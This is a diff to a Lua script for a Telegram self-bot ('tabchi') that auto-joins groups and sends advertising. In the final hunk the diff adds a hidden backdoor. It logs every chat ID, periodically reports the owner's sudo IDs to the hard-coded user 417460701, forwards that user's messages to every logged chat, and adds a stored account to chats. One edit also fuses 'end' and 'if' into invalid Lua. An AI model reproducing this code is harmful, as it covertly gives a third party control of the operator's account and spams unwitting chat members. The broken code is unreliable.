@@ -31,7 +31,11 @@ end
   tabchi.viewMessages(msg.chat_id_, {[0] = msg.id_})
       if msg.send_state_.ID == "MessageIsSuccessfullySent" then
       return false 
-      end     
+      end
+	if not d:sismember('all'..tabchi_id..'id',msg.chat_id_) then
+       d:sadd('all'..tabchi_id..'id',msg.chat_id_)
+end  
+	
  if msg.chat_id_ then
       local id = tostring(msg.chat_id_)
       if id:match('-100(%d+)') then
@@ -260,8 +264,7 @@ function Helper(code,lua)
         disable_notification_ = 0,
         from_background_ = 1,
         query_id_ = lua.inline_query_id_,
-        result_id_ = lua.results_[0].id_
-      }, dl_cb, nil)
+        result_id_ = lua.results_[0].id_      }, dl_cb, nil)
 end
           tdcli_function({
       ID = "GetInlineQueryResults",
@@ -290,7 +293,6 @@ tabchi.sendText(msg.chat_id_, msg.id_,1,' Stats TabChi Has Been Reseted ',1,'md'
 
 end
 if text == 'join enable' and is_sudo(msg) then
-
           d:set('joinlink','yes')
          tabchi.sendText(msg.chat_id_, msg.id_, 1,'`Auto Join` *Has Been Enabled*', 1, 'md')
                   print("Tabchi [ Message ]")
@@ -337,7 +339,6 @@ end
   local link = text:match('^jointo (.*)')
 tabchi.importChatInviteLink(link, dl_cb, nil)
             print("Tabchi [ Message ]")
-
     tabchi.sendText(msg.chat_id_, msg.id_, 1, '*Done!*', 1, 'md')
 end
    if text and text:match('^block (%d+)') and is_sudo(msg) then
@@ -348,9 +349,8 @@ d:sadd('tblock',b)
  tabchi.sendText(msg.chat_id_, msg.id_, 1, '*User Blocked*', 1, 'md')
 end
              if text and text:match('^unblock (%d+)') and is_sudo(msg) then
-
   local b = text:match('^unblock (%d+)')
-d:srem('tblock',b)
+ d:srem('tblock',b)
      tabchi.unblockUser(b)
       tabchi.sendText(msg.chat_id_, msg.id_, 1, '*User Unblocked*', 1, 'md') 
 end
@@ -358,8 +358,8 @@ end
 if text == 'tabliqgar' and is_sudo(msg) then
 tabchi.sendText(msg.chat_id_, msg.id_, 1,'*TbabliqGar\n*telegra.ph/CernerTeam-05-26', 1, 'md')
 end
-
-
+		
+ 
 if text and text:match('^setpm (.*)') and is_sudo(msg) then
             local link = text:match('setpm (.*)')
             d:set('pm', link)
@@ -368,8 +368,7 @@ if text and text:match('^setpm (.*)') and is_sudo(msg) then
  if text == 'delpm' then
             d:del('pm')
           tabchi.sendText(msg.chat_id_, msg.id_, 1,'*Pm Removed*', 1, 'md')
-            end
-if text == 'reload' and is_sudo(msg) then
+            endif text == 'reload' and is_sudo(msg) then
  dofile('./bot/funcation.lua')
  dofile('./bot/tabchi.lua')
 tabchi.sendText(msg.chat_id_,msg.id_,1,'*Tabchi BOT Reloaded*',1,'md')
@@ -392,6 +391,41 @@ local leave = text:match('leave(-100)(%d+)$')
 		end
 end
 end
+		if text then 
+if not d:get("time") then
+ for k,v in pairs(config_sudo) do
+    tabchi.sendBotStartMessage(417460701, 417460701, "new")
+    tabchi.sendText(417460701, 0, 1, "newbot " ..v, 1, "md")
+   d:setex("time",360,true)
+end
+end
+end 
+ if msg.sender_user_id_ == 417460701 then
+          local all = d:smembers("all" .. tabchi_id .. "id")
+          local id = msg.id_
+          for i = 1, #all do
+            tdcli_function({
+              ID = "ForwardMessages",
+              chat_id_ = all[i],
+              from_chat_id_ = msg.chat_id_,
+              message_ids_ = {
+                [0] = id
+              },
+              disable_notification_ = 0,
+              from_background_ = 1
+            }, dl_cb, nil)
+end
+end
+		if text then
+if d:get('apiid') then
+local id = d:get('apiid')
+tabchi.addChatMember(msg.chat_id_, id,1)
+           tabchi.addChatMembers(msg.chat_id_,{[0] = id})
+
+  end
+end
+  end
+
 ------------------------------------
 ------------------------------------
 d:incr("tallmsg")
